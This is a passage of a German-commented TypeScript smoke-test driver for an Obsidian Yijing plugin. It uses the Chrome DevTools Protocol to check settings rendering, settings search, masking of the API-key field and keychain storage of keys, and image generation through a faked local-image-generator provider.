      : platte.llm?.apiKey === undefined && zeilenMitKlartext === eps.length,
    bund
      ? `data.json: llm.apiKey ${platte.llm?.apiKey === undefined ? "fehlt" : "ist noch da"}, ${zeilenMitKlartext} Zeile(n) mit Klartext-Schluessel · Schluesselbund: ${Object.keys(bund).filter((i) => i.startsWith(EP_SECRET_PREFIX)).length} Zeilen-Eintrag/-Eintraege, alter Einzel-Eintrag ${LEGACY_SECRET_ID in bund ? "unangetastet" : "(war nicht gesetzt)"}`
      : `kein Schluesselbund (< 1.11.4) — ${zeilenMitKlartext} Zeile(n) mit Klartext-Schluessel`,
  );
  // Welle 17: das globale Modell (`llm.model`, Altwert „qwen3-30b“) ist abgeschafft. Es wandert beim Laden
  // einmal in jede Zeile ohne Modell; der Schluessel verlaesst Speicher UND Platte.
  record(
    "B9 Altwert llm.model wandert in die Zeilen, der Schluessel verschwindet (Speicher und data.json)",
    eps.length === 2 && eps.every((e) => (e as { model?: string }).model === BESTAND_030.llm.model)
      && !("model" in llm) && !("model" in (platte.llm ?? {})),
    `Modelle der Zeilen: ${JSON.stringify(eps.map((e) => (e as { model?: string }).model ?? null))} · llm.model im Speicher: ${"model" in llm} · auf der Platte: ${"model" in (platte.llm ?? {})}`,
  );
}

/** C — Bild-Sektion im Settings-Modal (Handover-Schritte 3, 6, 9). */
async function abschnittSettings(cdp: Cdp, port: number): Promise<void> {
  console.log("\n── C · Bild-Sektion im Einstellungen-Fenster ──");

  const ui = await openSettingsTab(cdp, port);
  record(
    "C1 Einstellungen-Tab oeffnet",
    ui !== null,
    ui ? `Bild-Sektion sichtbar (${ui.eigenesFenster ? "eigenes Fenster, ab 1.13" : "Modal, bis 1.12"})` : "Tab-Inhalt in keinem Fenster gefunden",
  );
  if (!ui) return;

  // Welle 17: keine eigene Zeile „Modell“ mehr, keine Option „global model“ in einer Auswahl.
  const modellUi = await ui.cdp.evaluate<{ zeile: boolean; option: boolean }>(`
    const names = [...document.querySelectorAll(${JSON.stringify(ui.praefix)} + ".setting-item-name")].map((n) => (n.textContent || "").trim().toLowerCase());
    const opts = [...document.querySelectorAll(${JSON.stringify(ui.praefix)} + "select option")].map((o) => (o.textContent || "").toLowerCase());
    return { zeile: names.some((n) => n === "model" || n === "modell"), option: opts.some((o) => o.includes("global model")) };`);
  record(
    "C1b Keine Settings-Zeile „Model“ und keine Option „global model“",
    !modellUi.zeile && !modellUi.option,
    `Zeile „Model“: ${modellUi.zeile ? "da" : "fehlt"} · Option „global model“: ${modellUi.option ? "da" : "fehlt"}`,
  );

  // C2 — sprachunabhaengig, wo es geht: die Reste der Eigenbau-Anbindung am Platzhalter und an der Struktur, die zwei neuen
  // Zeilen an ihrem (EN/DE) Namen.
  const m = await ui.cdp.evaluate<{ backendAuswahl: boolean; workflow: boolean; schritte: boolean; endpunktZeile: boolean; quelle: boolean; stil: boolean }>(`
    const modal = ${wurzelAusdruck(ui)};
    if (!modal) return { backendAuswahl: false, workflow: false, schritte: false, endpunktZeile: false, quelle: false, stil: false };
    const namen = [...modal.querySelectorAll(".setting-item-name")].map((n) => (n.textContent || "").trim().toLowerCase());
    return {
      backendAuswahl: Boolean([...modal.querySelectorAll("select")].find((x) => x.querySelector('option[value="comfyui"]') || x.querySelector('option[value="a1111"]'))),
      workflow: Boolean(modal.querySelector(".yijing-workflow-status")),
      schritte: Boolean(modal.querySelector('input[placeholder="28"]')),
      endpunktZeile: namen.some((n) => n === "image endpoint" || n === "bild-endpunkt"),
      quelle: namen.some((n) => n === "image source" || n === "bildquelle"),
      stil: namen.some((n) => n === "style suffix" || n === "stil-suffix"),
    };`);
  record(
    "C2 Bild-Sektion: Bildquelle und Stil-Suffix, kein Backend-, Endpunkt-, Workflow- oder Schritte-Feld",
    m.quelle && m.stil && !m.backendAuswahl && !m.workflow && !m.schritte && !m.endpunktZeile,
    `Bildquelle ${m.quelle} · Stil ${m.stil} · Backend-Auswahl ${m.backendAuswahl} · Workflow-Feld ${m.workflow} · Schritte ${m.schritte} · Endpunkt-Zeile ${m.endpunktZeile}`,
  );
  await closeSettings(cdp, ui);

  // C3 — der Hinweis liest den Anbieter bei jedem Zeichnen: ohne Anbieter (Slot versteckt), mit Anbieter (Fake).
  await ligSlot(cdp, "verstecken");
  const uiOhne = await openSettingsTab(cdp, port);
  const ohne = uiOhne ? await bildquelleHinweis(uiOhne) : null;
  if (uiOhne) await closeSettings(cdp, uiOhne);
  await ligSlot(cdp, "fake-ok");
  const uiMit = await openSettingsTab(cdp, port);
  const mit = uiMit ? await bildquelleHinweis(uiMit) : null;
  if (uiMit) await closeSettings(cdp, uiMit);
  await ligSlot(cdp, "zurueck");
  record(
    "C3 Der Hinweis folgt dem Anbieter: fehlt er, nennt er das Plugin; mit Anbieter nennt er die Quelle",
    ohne !== null && mit !== null && /no images without|ohne das plugin/i.test(ohne) && /images come from|bilder kommen vom plugin/i.test(mit) && ohne !== mit,
    `ohne Anbieter: ${JSON.stringify(ohne?.slice(0, 70) ?? null)} · mit Anbieter: ${JSON.stringify(mit?.slice(0, 70) ?? null)}`,
  );
}

/**
 * F — die deklarative Settings-API (`getSettingDefinitions`, Obsidian >= 1.13).
 *
 * Warum das ein eigener Abschnitt ist: die Migration verlegt das Rendern der Einstellungen
 * vom eigenen Code zum Host. Was danach in der Oberflaeche steht, kann kein vitest-Fall mehr
 * zeigen — und die drei Fallstricke der Umstellung sind alle **stille**: bedingte Zeilen, die
 * nie erscheinen (`visible` wertet der native Renderer an Gruppen-Items nicht aus), ein Tab,
 * der nach einer Zustandsaenderung nicht nachzieht (der Host rendert gecachte `settingItems`),
 * und Zeilen, die zwar rendern, aber nicht in der Einstellungs-Suche landen — dem einzigen
 * Grund, aus dem die Umstellung ueberhaupt lohnt.
 *
 * Unter 1.12 gibt es den nativen Pfad nicht; dort wird der Abschnitt uebersprungen statt rot.
 */
/** Die Punkte des Abschnitts F (Reihenfolge wie `PUNKTE`). */
const F_NAMEN = PUNKTE.filter((n) => n.startsWith("F"));

async function abschnittDeklarativ(cdp: Cdp, port: number): Promise<void> {
  console.log("\n── F · Deklarative Settings-API ──");

  const ui = await openSettingsTab(cdp, port);
  if (!ui) {
    for (const n of F_NAMEN) unmeasured(n, "Einstellungen-Tab in keinem Fenster gefunden");
    return;
  }

  // Die Definitionen leben im HAUPTfenster: das ausgelagerte Einstellungen-Fenster hat
  // seinen eigenen Kontext und kennt kein `app` (gemessen 2026-08-16 gegen 1.13.7 — ein
  // `app.setting.activeTab` dort wirft "app is not defined").
  const defs = await cdp.evaluate<{
    hatApi: boolean;
    hatUpdate: boolean;
    gruppen: number;
    leereGruppen: number;
    uebernommen: number | null;
    alle: number;
    fmMitFeldern: number;
    fmOhneFelder: number;
  } | null>(`
    const tab = app.setting.activeTab;
    if (!tab || typeof tab.getSettingDefinitions !== "function") return null;
    const fmGruppe = (d) => d.find((g) => (g.items || []).some((i) => i.control && i.control.key === "includeFrontmatter"));
    const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];

    const vorher = p.settings.includeFrontmatter;
    p.settings.includeFrontmatter = true;
    const mit = (fmGruppe(tab.getSettingDefinitions()).items || []).length;
    p.settings.includeFrontmatter = false;
    const ohne = (fmGruppe(tab.getSettingDefinitions()).items || []).length;
    p.settings.includeFrontmatter = vorher;

    // Erstes Element ist die Hilfe-Zeile (F9), keine Gruppe: Gruppen getrennt zaehlen, der Host
    // uebernimmt aber ALLE Elemente.
    const alle = tab.getSettingDefinitions();
    const d = alle.filter((g) => g.type === "group");
    return {
      alle: alle.length,
      hatApi: true,
      hatUpdate: typeof tab.update === "function",
      gruppen: d.length,
      leereGruppen: d.filter((g) => !(g.items || []).length).length,
      uebernommen: Array.isArray(tab.settingItems) ? tab.settingItems.length : null,
      fmMitFeldern: mit,
      fmOhneFelder: ohne,
    };
  `);

  if (!defs?.hatUpdate) {
    // Kein update() → Obsidian < 1.13, der native Pfad existiert nicht.
    for (const n of F_NAMEN) skipped(n, "Obsidian ohne native 1.13-Settings-API (Fallback-Pfad) — in dieser Lage nicht anwendbar");
    await closeSettings(cdp, ui);
    return;
  }

  record(
    "F1 Tab liefert deklarative Definitionen",
    defs.gruppen > 0 && defs.leereGruppen === 0 && defs.uebernommen === defs.alle,
    `${defs.gruppen} Gruppen + Hilfe-Zeile, keine leer, vom Host uebernommen: ${String(defs.uebernommen)} von ${defs.alle}`,
  );

  // Genau der Fallstrick, an dem zwei Nachbar-Plugins haengen geblieben sind: bedingte
  // Zeilen muessen WEGGELASSEN werden. Ein `visible: false` waere hier unsichtbar falsch —
  // die Zahl bliebe gleich und die Zeile stuende trotzdem in der Oberflaeche.
  record(
    "F2 bedingte Zeilen werden weggelassen, nicht versteckt",
    defs.fmOhneFelder === 1 && defs.fmMitFeldern > 1,
    `Frontmatter-Gruppe: ${defs.fmMitFeldern} Zeilen mit Feldern, ${defs.fmOhneFelder} ohne`,
  );

  const zeilenVorher = await zeilenZahl(ui);
  await cdp.evaluate(`
    await app.setting.activeTab.setControlValue("includeFrontmatter", false);
    await new Promise((r) => setTimeout(r, 500));
    return true;
  `);
  const zeilenAus = await zeilenZahl(ui);
  await cdp.evaluate(`
    await app.setting.activeTab.setControlValue("includeFrontmatter", true);
    await new Promise((r) => setTimeout(r, 500));
    return true;
  `);
  const zeilenWieder = await zeilenZahl(ui);
  const erwarteteDifferenz = defs.fmMitFeldern - defs.fmOhneFelder;
  record(
    "F3 Oberflaeche zieht nach einer Wertaenderung nach",
    zeilenVorher - zeilenAus === erwarteteDifferenz && zeilenWieder === zeilenVorher,
    `Zeilen ${zeilenVorher} → ${zeilenAus} → ${zeilenWieder} (erwartete Differenz ${erwarteteDifferenz})`,
  );

  // F9 — die Hilfe-Zeile (UI-STANDARD §8) ist die ERSTE Zeile oben im gezeichneten Tab, mit Text-Knopf
  // und `bug`-Knopf. Gemessen am DOM, nicht an den Definitionen: der Host kann umsortieren.
  // Geklickt wird nicht (der Klick oeffnete einen Browser); die URLs deckt tests/help-row.test.ts.
  const hilfe = await ui.cdp.evaluate<{ erste: string | null; knopf: string | null; bug: string | null }>(`
    const wurzel = ${wurzelAusdruck(ui)};
    const z = wurzel ? wurzel.querySelector(".setting-item") : null;
    return {
      erste: z?.querySelector(".setting-item-name")?.textContent?.trim() ?? null,
      knopf: z?.querySelector("button")?.textContent?.trim() ?? null,
      bug: z?.querySelector(".extra-setting-button")?.getAttribute("aria-label") ?? null,
    };
  `);
  record(
    "F9 die Hilfe-Zeile steht als erste Zeile oben im Settings-Tab",
    (hilfe.erste === "Help" || hilfe.erste === "Hilfe") && !!hilfe.knopf && !!hilfe.bug,
    `erste Zeile „${hilfe.erste}“, Knopf „${hilfe.knopf}“, bug-Tooltip „${hilfe.bug}“`,
  );

  // Der eigentliche Gewinn der Umstellung. Der Suchbegriff kommt aus der eigenen Definition,
  // nicht aus einer festen Zeichenkette — sonst misst der Treiber die UI-Sprache.
  const begriff = await cdp.evaluate<string>(`
    const d = app.setting.activeTab.getSettingDefinitions().filter((g) => g.type === "group");
    return d[0].items[0].name;
  `);
  const treffer = await sucheInEinstellungen(ui, begriff);
  const nichts = await sucheInEinstellungen(ui, "zzqqxx-gibtesnicht");
  record(
    "F4 Einstellungen erscheinen in Obsidians Einstellungs-Suche",
    treffer > 0 && nichts === 0,
    `"${begriff}" → ${treffer} Treffer unter "${PLUGIN_NAME}", Unsinn → ${nichts}`,
  );

  // F5 prueft den ANDEREN Pfad. Unter 1.13 ruft der Host `display()` nie — der Fallback
  // fuer aeltere Obsidian-Versionen liefe also ungeprueft mit. Ein direkter Aufruf zeichnet
  // ihn in denselben Container: dieselben Zeilen, mit der klassischen Setting-API gebaut.
  // Das ersetzt keine Messung auf einem echten 1.12, deckt aber den teuren Fehler ab (der
  // Walker zeichnet die Struktur gar nicht oder nur halb).
  const nativZeilen = await zeilenZahl(ui);
  await cdp.evaluate(`
    app.setting.activeTab.display();
    await new Promise((r) => setTimeout(r, 700));
    return true;
  `);
  const fallbackZeilen = await zeilenZahl(ui);
  record(
    "F5 Fallback-Pfad (< 1.13) zeichnet dieselbe Struktur",
    fallbackZeilen === nativZeilen,
    `nativ ${nativZeilen} Zeilen, display()-Fallback ${fallbackZeilen}`,
  );

  // F6/F7 messen die API-Schluessel-Zeile. Sie ist der einzige Fall, in dem eine Zeile
  // maskieren MUSS und die deklarative API es nicht kann (SettingTextControl kennt nur
  // type: 'text') — sie ist deshalb eine render-Hatch. Zwei Dinge koennen dabei still
  // schiefgehen, und beide waeren dem Nutzer gegenueber schwerwiegend:
  //   F6 — die Zeile faellt aus der Einstellungs-Suche. Genau die Auffindbarkeit war der
  //        ganze Ertrag von 0.5.0. Gesucht wird nach "token": der Begriff steht in KEINEM der
  //        vier Strings der Zeile (name/desc in EN und DE), ein Treffer beweist also, dass
  //        `aliases` durchschlaegt, und nicht nur, dass irgendein Wort irgendwo vorkommt.
  //        ⚠️ Hier stand zuerst "bearer" — und der Punkt war GRUEN, obwohl die Gegenprobe die
  //        Aliase entfernt hatte: "Authorization: Bearer …" steht in der Erklaerzeile, die
  //        derselbe Commit hinzugefuegt hat. Der Punkt mass die Beschreibung statt der Aliase.
  //        Gefunden hat das nur die Sabotage; ein gruener Erstlauf haette den Fehler
  //        beglaubigt (Muster von markdown-presentation, 2026-09-02: ein Punkt, der trotz
  //        Sabotage gruen BLEIBT, ist sofort verdaechtig).
  //   F7 — die Maskierung greift im nativen Pfad nicht. Der Unit-Test misst den Renderer
  //        gegen den Mock; ob Obsidian das inputEl wirklich so uebernimmt, sagt nur das
  //        laufende Programm.
  const trefferAlias = await sucheInEinstellungen(ui, "token");
  record(
    "F6 maskierte Zeile bleibt ueber Aliase auffindbar",
    trefferAlias > 0,
    `"token" → ${trefferAlias} Treffer unter "${PLUGIN_NAME}" (Begriff steht nur in den aliases)`,
  );

  await sucheInEinstellungen(ui, "");
  // Umgeschrieben: bis 0.10 ein globales Schluesselfeld; jetzt traegt jede Endpunkt-Zeile des Kit-
  // Bausteins ihren Schluessel im Schluesselbund und zeigt „gespeichert“ mit Stift („aendern“)
  // statt eines Feldes. Das Feld erscheint erst nach dem Klick auf den Stift — F7 misst es dort.
  const stiftGeklickt = await ui.cdp.evaluate<boolean>(`
    const wurzel = document.querySelector(".vertical-tab-content-container") || document;
    const zeile = wurzel.querySelector(".okit-ep-row");
    const stift = zeile?.querySelector(".extra-setting-button svg.lucide-pencil")?.closest(".extra-setting-button")
      ?? zeile?.querySelector(".extra-setting-button");
    if (!stift) return false;
    stift.click();
    return true;
  `);
  await schlaf(400);
  const maskiert = await ui.cdp.evaluate<{ felder: number; typen: string[] }>(`
    const wurzel = document.querySelector(".vertical-tab-content-container") || document;
    const zeile = wurzel.querySelector(".okit-ep-row");
    const felder = [...(zeile ?? wurzel).querySelectorAll("input")].filter((i) => i.type === "password");
    return { felder: felder.length, typen: felder.map((f) => f.type) };
  `);
  record(
    "F7 API-Schluessel-Feld der Endpunkt-Zeile ist maskiert (nach „aendern“)",
    stiftGeklickt && maskiert.felder === 1,
    stiftGeklickt ? `${maskiert.felder} Feld(er) mit type=password in der ersten Endpunkt-Zeile` : "kein „aendern“-Knopf an der Endpunkt-Zeile gefunden",
  );

  // F8 misst den SPEICHERpfad ueber das echte Feld (B8 den Ladepfad): eine Eingabe muss im
  // Schluesselbund ankommen (unter dem Eintrag der Zeile) und data.json ohne Klartext lassen.
  // Bewusst ueber die Komponente statt ueber `plugin.settings` — ein Punkt, der den Zustand direkt
  // schreibt, haette den Weg, auf dem ein Defekt saesse, nie betreten (REGISTRY: „Pruefpunkt, der
  // den Defektpfad umgeht“). Der native Setter + `input`-Event, dann `blur` (der Kit-Baustein
  // schreibt bei blur, nicht pro Tastendruck): eine blosse Zuweisung an `value` feuert nichts.
  // Getippt wird im Einstellungen-Fenster (eigener JS-Kontext, kennt kein `app`), gemessen im
  // Hauptfenster.
  const F8_WERT = "smoke-f8-schluessel";
  const zeilenId = await cdp.evaluate<string | null>(`return app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}].settings.llm.endpoints[0]?.secretId ?? null;`);
  const getippt = await ui.cdp.evaluate<boolean>(`
    const wurzel = document.querySelector(".vertical-tab-content-container") || document;
    const feld = [...(wurzel.querySelector(".okit-ep-row") ?? wurzel).querySelectorAll("input")].find((i) => i.type === "password");
    if (!feld) return false;
    Object.getOwnPropertyDescriptor(Object.getPrototypeOf(feld), "value").set.call(feld, ${JSON.stringify(F8_WERT)});
    feld.dispatchEvent(new Event("input", { bubbles: true }));
    feld.dispatchEvent(new Event("blur"));
    return true;
  `);
  let f8 = { bund: null as Bund | null, wert: null as string | null };
  for (let i = 0; i < 12 && getippt; i++) {
    await schlaf(300);
    f8.bund = await schluesselbund(cdp);
    f8.wert = zeilenId && f8.bund ? (f8.bund[zeilenId] ?? null) : null;
    if (f8.wert === F8_WERT || f8.bund === null) break;
  }
  const f8Platte = JSON.parse((await readVaultFile(cdp, DATA_PATH)) ?? "{}") as { llm?: { endpoints?: Array<{ apiKey?: string }> } };
  const f8Klartext = (f8Platte.llm?.endpoints ?? []).some((e) => e.apiKey === F8_WERT);
  record(
    "F8 Eingabe im Feld landet im Schluesselbund (Eintrag der Zeile), nicht in data.json",
    getippt && (f8.bund ? f8.wert === F8_WERT && !f8Klartext : f8Klartext),
    !getippt
      ? "kein Passwortfeld gefunden"
      : f8.bund
        ? `Eintrag ${String(zeilenId)}=${JSON.stringify(f8.wert)} · Klartext in data.json: ${f8Klartext ? "ja" : "nein"}`
        : `kein Schluesselbund (< 1.11.4) — Klartext in data.json: ${f8Klartext ? "ja" : "nein"}`,
  );

  await closeSettings(cdp, ui);
}

/** Gerenderte Setting-Zeilen in der Einstellungen-Oberflaeche. */
async function zeilenZahl(ui: SettingsUi): Promise<number> {
  return ui.cdp.evaluate<number>(`
    const wurzel = ${wurzelAusdruck(ui)};
    return wurzel ? wurzel.querySelectorAll(".setting-item").length : -1;
  `);
}

/** Tippt in Obsidians Einstellungs-Suche und zaehlt die Treffer, die UNSEREM Plugin
 *  zugeordnet sind — die Ergebnisse stehen je Tab in einer eigenen Gruppe. */
async function sucheInEinstellungen(ui: SettingsUi, begriff: string): Promise<number> {
  return ui.cdp.evaluate<number>(`
    const feld = document.querySelector('input[type="search"]');
    if (!feld) return -1;
    feld.value = ${JSON.stringify(begriff)};
    feld.dispatchEvent(new Event("input", { bubbles: true }));
    await new Promise((r) => setTimeout(r, 600));
    const gruppe = [...document.querySelectorAll(".setting-search-result-group")].find(
      (g) => g.querySelector(".setting-search-result-tab-label")?.textContent?.trim() === ${JSON.stringify(PLUGIN_NAME)},
    );
    return gruppe ? gruppe.querySelectorAll(".setting-search-result-item").length : 0;
  `);
}

// --- D · Bildmeditation ueber local-image-generator (Kit-Vertrag `image-gen-provider`) ---------------

const LIG_ID = "local-image-generator";

/** Der Anbieter-Slot im Plugin-Register: `verstecken` (kein Anbieter), `fake-ok` (Fake, liefert nach 0,9 s ein 1×1-PNG in den
 *  Zielordner), `fake-fehler` (Fake, liefert den Fehlerwert `busy`), `zurueck` (Vorwert wiederherstellen, auch den echten). Der
 *  Vorwert liegt im Renderer auf `window` (CDP traegt kein Plugin-Objekt nach Node); der Fake zeichnet jeden Aufruf auf. */
async function ligSlot(cdp: Cdp, aktion: "verstecken" | "fake-ok" | "fake-fehler" | "zurueck"): Promise<void> {
  await cdp.evaluate(`
    const reg = app.plugins.plugins;
    const id = ${JSON.stringify(LIG_ID)};
    const aktion = ${JSON.stringify(aktion)};
    if (aktion === "zurueck") {
      if ("__ligVorher" in window) {
        const v = window.__ligVorher;
        if (v === null || v === undefined) delete reg[id]; else reg[id] = v;
        delete window.__ligVorher;
      }
      delete window.__lig;
      return { ok: true };
    }
    if (!("__ligVorher" in window)) window.__ligVorher = reg[id] ?? null;
    if (aktion === "verstecken") { delete reg[id]; return { ok: true }; }
    const PNG = Uint8Array.from(atob("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg=="), (c) => c.charCodeAt(0));
    window.__lig = window.__lig ?? { calls: [], n: 0 };
    window.__lig.modus = aktion === "fake-fehler" ? "fehler" : "ok";
    reg[id] = { __fakeLig: true, api: { version: 1, generateImage: async (prompt, o) => {
      window.__lig.calls.push({ prompt, targetFolder: o.targetFolder });
      await new Promise((r) => setTimeout(r, 900));
      if (window.__lig.modus === "fehler") return { error: "busy", message: "generation already running" };
      const folder = o.targetFolder;
      if (folder && !app.vault.getAbstractFileByPath(folder)) await app.vault.createFolder(folder);
      window.__lig.n++;
      const path = (folder ? folder + "/" : "") + "fake-lig-" + Date.now() + "-" + window.__lig.n + ".png";
      await app.vault.createBinary(path, PNG.buffer);
      return path;
    } } };
    return { ok: true };
  `);
}

/** Den echten local-image-generator aus einem gebauten Plugin-Ordner (`main.js`, `manifest.json`, `styles.css`) in den Vault legen
 *  und aktivieren. Ohne Modell: er meldet „nicht bereit“, erzeugt aber nichts und laedt nichts. */
async function ligEchtInstallieren(cdp: Cdp, dir: string): Promise<boolean> {
  const fs = await import("node:fs/promises");
  const dateien: Record<string, string> = {};
  for (const n of ["main.js", "manifest.json", "styles.css"]) dateien[n] = await fs.readFile(join(dir, n), "utf8").catch(() => "");
  if (!dateien["main.js"] || !dateien["manifest.json"]) return false;
  return cdp.evaluate<boolean>(`
    const id = ${JSON.stringify(LIG_ID)};
    const ordner = app.vault.configDir + "/plugins/" + id;
    const dateien = ${JSON.stringify(dateien)};
    if (!(await app.vault.adapter.exists(ordner))) await app.vault.adapter.mkdir(ordner);
    for (const [n, text] of Object.entries(dateien)) if (text) await app.vault.adapter.write(ordner + "/" + n, text);
    window.__ligEchtAngelegt = true;
    if (app.plugins.setEnable) await app.plugins.setEnable(true);
    await app.plugins.loadManifests();
    await app.plugins.enablePlugin(id);
    await new Promise((r) => setTimeout(r, 1500));
    return Boolean(app.plugins.plugins[id]?.api);
  `);
}

async function ligEchtEntfernen(cdp: Cdp): Promise<void> {
  await cdp.evaluate(`
    if (!window.__ligEchtAngelegt) return { ok: true };
    const id = ${JSON.stringify(LIG_ID)};
    await app.plugins.disablePlugin(id).catch(() => undefined);
    const ordner = app.vault.configDir + "/plugins/" + id;
    if (await app.vault.adapter.exists(ordner)) await app.vault.adapter.rmdir(ordner, true);
    if (app.plugins.manifests) delete app.plugins.manifests[id];
    delete window.__ligEchtAngelegt;
    return { ok: true };
  `).catch(() => null);
}

/** Panel neu aufbauen (es liest den Anbieter beim Zeichnen) und einen frischen Wurf machen. */
async function neuesPanelMitWurf(cdp: Cdp): Promise<boolean> {
  await cdp.evaluate(`
    for (const l of app.workspace.getLeavesOfType(${JSON.stringify(PANEL_VIEW)})) l.detach();
    await new Promise((r) => setTimeout(r, 300));
    return true;
  `);
  if (!(await openPanel(cdp))) return false;
  const ok = await clickPanelButton(cdp, ".yijing-oracle .yijing-actions button");
  await schlaf(500);
  return ok;
}

const kastenDa = (cdp: Cdp): Promise<boolean> => cdp.evaluate<boolean>(`return Boolean(document.querySelector(".yijing-artwork"));`);
const vorschauDatei = (cdp: Cdp): Promise<{ src: string; pfad: string | null }> => cdp.evaluate(`
  const i = document.querySelector(".yijing-artwork-img");
  if (!i) return { src: "", pfad: null };
  const f = app.vault.getFiles().filter((x) => x.extension === "png" && i.src.includes(encodeURI(x.path).replace(/%2F/g, "/"))).map((x) => x.path);
  return { src: i.src, pfad: f[0] ?? null };
`);

async function abschnittBild(cdp: Cdp, aufraeumen: string[], ligDir: string | undefined): Promise<void> {
  console.log("\n── D · Bildmeditation ueber local-image-generator ──");

  // D0 — kein Anbieter: der Kasten fehlt (nicht „leer mit Fehlermeldung“).
  await ligSlot(cdp, "verstecken");
  await neuesPanelMitWurf(cdp);
  const ohne = await kastenDa(cdp);
  record("D0 Ohne Bild-Anbieter fehlt der Bild-Kasten", !ohne, ohne ? ".yijing-artwork steht trotz fehlendem Anbieter im Panel" : "kein .yijing-artwork im Panel");
  await ligSlot(cdp, "zurueck");

  // D10 — der echte Anbieter ohne Modell (nur mit --lig <gebauter Plugin-Ordner>).
  if (ligDir === undefined) {
    skipped("D10 Echter local-image-generator ohne Modell: Bild-Kasten da, Knopf meldet den Grund statt eines Bildes", "--lig <Ordner> nicht gesetzt (gebauter local-image-generator)");
  } else {
    const da = await ligEchtInstallieren(cdp, ligDir);
    if (!da) {
      unmeasured("D10 Echter local-image-generator ohne Modell: Bild-Kasten da, Knopf meldet den Grund statt eines Bildes", `local-image-generator aus ${ligDir} liess sich nicht laden (api fehlt)`);
    } else {
      await neuesPanelMitWurf(cdp);
      const kasten = await kastenDa(cdp);
      const geklickt = kasten && (await clickPanelButton(cdp, ".yijing-artwork .yijing-actions button"));
      const meldung = geklickt
        ? await pollUntil<string>(cdp, `const t = [...document.querySelectorAll(".notice")].map((n) => n.textContent || "").find((x) => /image generation failed|bildgenerierung fehlgeschlagen/i.test(x)); return t ?? null;`, 25_000, 500)
        : null;
      const bild = await cdp.evaluate<boolean>(`return Boolean(document.querySelector(".yijing-artwork-img"));`);
      record(
        "D10 Echter local-image-generator ohne Modell: Bild-Kasten da, Knopf meldet den Grund statt eines Bildes",
        kasten && meldung !== null && !bild,
        `Kasten ${kasten} · Meldung ${JSON.stringify(meldung?.slice(0, 110) ?? null)} · Bild im Kasten ${bild}`,
      );
      await ligEchtEntfernen(cdp);
    }
  }

  // Ab hier der Fake-Anbieter: er erzeugt ein echtes PNG im Vault, ohne Server und ohne Modell.
  await ligSlot(cdp, "fake-ok");
  await neuesPanelMitWurf(cdp);
  const mit = await kastenDa(cdp);
  record("D1 Mit Bild-Anbieter erscheint der Bild-Kasten", mit, mit ? ".yijing-artwork im Panel" : "Kasten fehlt");
  if (!mit) return;

  const gestartet = await clickPanelButton(cdp, ".yijing-artwork .yijing-actions button");
  record("D2 Generieren startet", gestartet, gestartet ? "Knopf geklickt" : "kein Knopf im Bild-Kasten");
  if (!gestartet) return;

  // D4 — der Fake haelt 0,9 s: in dieser Zeit steht der Status in der Zeile (kein leerer Kasten, kein altes Bild).
  const status = await pollUntil<string>(cdp, `const s = (document.querySelector(".yijing-artwork .yijing-empty")?.textContent || "").trim(); return /generating image|bild wird generiert/i.test(s) ? s : null;`, 3000, 100);
  record("D4 Waehrend des Laufs steht der Status der Generierung", status !== null, status !== null ? JSON.stringify(status) : "kein Status in der Zeile gesehen");

  const bild = await pollUntil<{ src: string; pfad: string | null }>(cdp, `
    const i = document.querySelector(".yijing-artwork-img");
    if (!i) return null;
    const f = app.vault.getFiles().filter((x) => x.extension === "png" && i.src.includes(encodeURI(x.path).replace(/%2F/g, "/"))).map((x) => x.path);
    return f.length > 0 ? { src: i.src, pfad: f[0] } : null;`, 8000, 200);
  let png = false;
  if (bild?.pfad) {
    aufraeumen.push(bild.pfad);
    png = await cdp.evaluate<boolean>(`
      const b = new Uint8Array(await app.vault.adapter.readBinary(${JSON.stringify(bild.pfad)}));
      return b.length > 8 && b[0] === 0x89 && b[1] === 0x50 && b[2] === 0x4e && b[3] === 0x47;`);
  }
  record(
    "D3 Bild kommt an: die Datei im Vault ist ein PNG, die Vorschau zeigt sie",
    bild !== null && png && !bild.src.startsWith("data:"),
    bild ? `Datei ${bild.pfad} (PNG-Kopf ${png}), Vorschau-URL ${bild.src.slice(0, 40)}…` : "kein Bild mit passender Vault-Datei",
  );
  if (!bild?.pfad) return;
  const erstesBild = bild.pfad;

  const szene = await cdp.evaluate<number>(`return (document.querySelector(".yijing-artwork-scene")?.textContent || "").trim().length;`);
  record("D5 Szenen-Satz steht unter dem Bild", szene > 20, `${szene} Zeichen`);

  // D6 — was der Anbieter bekam.
  const aufruf = await cdp.evaluate<{ prompt: string; targetFolder: string; erwartet: string; suffix: string; szene: string }>(`
    const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
    const c = window.__lig.calls[0];
    const probe = await app.fileManager.getAvailablePathForAttachment("yijing-image.png", p.settings.readingsFolder + "/x.md");
    const slash = probe.lastIndexOf("/");
    return { prompt: c.prompt, targetFolder: c.targetFolder, erwartet: slash === -1 ? "" : probe.slice(0, slash), suffix: p.settings.image.styleSuffix, szene: (document.querySelector(".yijing-artwork-scene")?.textContent || "").trim() };
  `);
  record(
    "D6 Prompt traegt Szene und Stil-Suffix, Zielordner ist der Anhaenge-Ordner",
    aufruf.prompt.endsWith(aufruf.suffix) && aufruf.prompt.includes(aufruf.szene.slice(0, 20)) && aufruf.targetFolder === aufruf.erwartet,
    `Prompt ${JSON.stringify(aufruf.prompt.slice(0, 60))}… endet mit Suffix: ${aufruf.prompt.endsWith(aufruf.suffix)} · Zielordner ${JSON.stringify(aufruf.targetFolder)} (erwartet ${JSON.stringify(aufruf.erwartet)})`,
  );

  // D7 — „Neu generieren“: das zweite Bild ersetzt das erste, das erste (nie gespeichert) verschwindet aus dem Vault.
  await clickPanelButton(cdp, ".yijing-artwork .yijing-actions button");
  const zweites = await pollUntil<string>(cdp, `
    const i = document.querySelector(".yijing-artwork-img");
    if (!i) return null;
    const f = app.vault.getFiles().filter((x) => x.extension === "png" && i.src.includes(encodeURI(x.path).replace(/%2F/g, "/"))).map((x) => x.path);
    return f.length > 0 && f[0] !== ${JSON.stringify(erstesBild)} ? f[0] : null;`, 8000, 200);
  if (zweites) aufraeumen.push(zweites);
  await schlaf(600);
  const ersteWeg = await cdp.evaluate<boolean>(`return app.vault.getAbstractFileByPath(${JSON.stringify(erstesBild)}) === null;`);
  record(
    "D7 Neu generieren raeumt das ungespeicherte Bild weg",
    zweites !== null && ersteWeg,
